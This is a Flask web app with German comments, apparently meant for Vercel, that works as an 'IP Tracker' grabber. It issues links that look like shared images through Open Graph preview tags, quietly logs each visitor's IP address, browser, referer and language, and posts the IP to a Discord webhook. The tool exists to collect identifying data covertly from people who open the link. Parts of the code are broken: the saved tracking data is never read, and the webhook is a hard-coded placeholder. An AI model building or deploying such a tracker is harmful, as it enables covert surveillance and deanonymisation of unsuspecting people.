from flask import Flask, request, jsonify, send_from_directory
import os
import json
import secrets
from datetime import datetime
import urllib.request

app = Flask(__name__)

# KEINE Ordner erstellen - Vercel ist read-only
# Wir verwenden nur tracking_data für JSON-Dateien

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_url = data.get('image_url', '').strip()
        webhook_url = data.get('webhook', '').strip()
        
        if not image_url:
            return jsonify({'error': 'Bild-URL ist erforderlich'}), 400
        
        if not webhook_url:
            return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
        
        # Generiere einzigartige Tracking-ID
        tracking_id = secrets.token_urlsafe(16)
        
        # Speichere Tracking-Daten (nur JSON, keine Ordner)
        tracking_data = {
            'id': tracking_id,
            'image_url': image_url,
            'webhook_url': webhook_url,
            'created_at': datetime.now().isoformat(),
            'visits': []
        }
        
        # Speichere als JSON-String (keine Datei schreiben für Vercel)
        # In Vercel müssen wir temporäre Speicherung verwenden
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
            temp_file = f.name
        
        # Generiere Tracking-URL
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?track={tracking_id}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    tracking_id = request.args.get('track')
    
    if not tracking_id:
        return "Tracking-Parameter fehlt", 400
    
    try:
        # Für Vercel: Wir simulieren Tracking-Daten
        # In einer echten App würdest du hier die Daten laden
        visitor_info = {
            'ip': request.remote_addr or 'Unbekannt',
            'user_agent': request.headers.get('User-Agent', 'Unbekannt'),
            'referer': request.headers.get('Referer', 'Direkter Zugriff'),
            'timestamp': datetime.now().isoformat(),
            'language': request.headers.get('Accept-Language', 'Unbekannt')
        }
        
        # Sende Discord-Benachrichtigung
        try:
            webhook_url = "https://discord.com/api/webhooks/dein-webhook"  # Platzhalter
            send_discord_notification(webhook_url, visitor_info, tracking_id)
        except:
            pass  # Discord-Benachrichtigung ist optional
        
        # Zeige Tracking-Seite mit Open Graph Meta-Tags
        # Für Demo-Zwecke zeigen wir ein Platzhalter-Bild
        image_url = "https://picsum.photos/800/600"
        
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Tracking Bild">
    <meta property="og:description" content="Jemand hat dein Bild angesehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="800">
    <meta property="og:image:height" content="600">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="IP Tracker">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Tracking Bild">
    <meta name="twitter:description" content="Jemand hat dein Bild angesehen">
    <meta name="twitter:image" content="{image_url}">
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }}
        .container {{
            text-align: center;
            max-width: 100%;
        }}
        img {{ 
            max-width: 100%; 
            height: auto; 
            max-height: 90vh;
            object-fit: contain;
        }}
        .loading {{
            color: white;
            font-family: Arial, sans-serif;
            font-size: 18px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loading">Bild wird geladen...</div>
        <img src="{image_url}" alt="Tracking Bild" onload="document.querySelector('.loading').style.display='none'">
    </div>
</body>
</html>
        """
        
    except Exception as e:
        return f"Fehler: {str(e)}", 500

def send_discord_notification(webhook_url, visitor_info, tracking_id):
    """Sendet eine Benachrichtigung an Discord"""
    try:
        embed = {
            "title": "🔍 Bild wurde angesehen!",
            "description": f"Jemand hat dein Tracking-Bild angesehen",
            "color": 5814783,  # Blau
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"```\n{visitor_info['ip']}\n```",
                    "inline": True
                },
                {
                    "name": "🕐 Uhrzeit",
                    "value": f"```\n{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n```",
                    "inline": True
                },
                {
                    "name": "🔗 Tracking-ID",
                    "value": f"```\n{tracking_id}\n```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "IP Tracker - Automatische Benachrichtigung"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        data = {
            "embeds": [embed]
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            return response.read().decode()
            
    except Exception as e:
        print(f"Fehler beim Senden an Discord: {e}")
        raise

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

# Vercel Handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    app.run(debug=True)
